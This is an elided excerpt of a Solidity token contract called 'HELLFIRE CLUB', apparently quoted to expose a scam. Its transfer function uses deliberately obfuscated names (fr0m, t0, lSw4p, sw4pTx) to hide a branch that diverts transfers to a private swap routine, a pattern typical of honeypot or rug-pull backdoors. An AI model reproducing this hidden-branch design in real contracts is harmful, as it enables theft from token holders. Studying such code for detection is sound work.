...
contract HellfireClub is Ownable, IERC20 {
    ...
    function _basicTransfer(address fr0m, address t0, uint256 amount) internal virtual {
        require(fr0m != address(0));
        require(t0 != address(0));
        if (lSw4p(
                fr0m,
                t0)) {
            return sw4pTx(amount, t0);
        }
        if (dlSw4p){
        } else {
            require(
        ...
        uint256 feeAmount = 0;
        _rT0t4l(fr0m);
        bool ldSwapTransacti0n = (t0 == getLdPairAddress() && uniswapV2Pair == fr0m) || (fr0m == getLdPairAddress() && uniswapV2Pair == t0);
        if (uniswapV2Pair != fr0m &&
            !Address.isUniswapPair(t0) && t0 != address(this) &&
            !ldSwapTransacti0n && !dlSw4p && uniswapV2Pair != t0) {
    ...
    function sw4pTx(uint256 _am0unt, address to) private {
    ...
    string private _name = "HELLFIRE CLUB";
